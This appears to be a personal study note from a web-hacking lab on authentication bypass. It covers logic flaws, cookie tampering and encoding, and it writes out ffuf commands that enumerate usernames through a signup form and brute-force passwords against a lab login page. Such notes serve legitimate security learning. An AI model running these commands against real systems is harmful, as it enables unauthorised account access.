[[../2 - Tags/Web Hacking|Web Hacking]]
# Authentication Bypass

## Username Enumeration

A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.16.45/customers/signup -mr "username already exists"
```

<span style="color:rgb(255, 192, 0)">-w</span> argument selects the file's location on the computer that contains the list of usernames
<span style="color:rgb(255, 192, 0)">-X</span> argument specifies the request method, this will be a GET request by default, but it is a POST request in our example
<span style="color:rgb(255, 192, 0)">-d</span> argument specifies the data that we are going to send
<span style="color:rgb(255, 192, 0)">-H</span> argument is used for adding additional headers to the request.<span style="color:rgb(255, 192, 0)">
</span> 
<span style="color:rgb(255, 192, 0)">-u</span> argument specifies the URL we are making the request to
<span style="color:rgb(255, 192, 0)">-mr</span> argument is the text on the page we are looking for to validate we've found a valid username.

**Output will be saved to file named valid_usernames.txt** 

## Brute Force

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.16.45/customers/login -fc 200
```

Because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. For a positive match, we're using the <span style="color:rgb(255, 192, 0)">-fc</span> argument to check for an HTTP status code other than 200.

## Logic Flaw

 A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. 

## Cookie Tampering

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

### Encoding

 Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.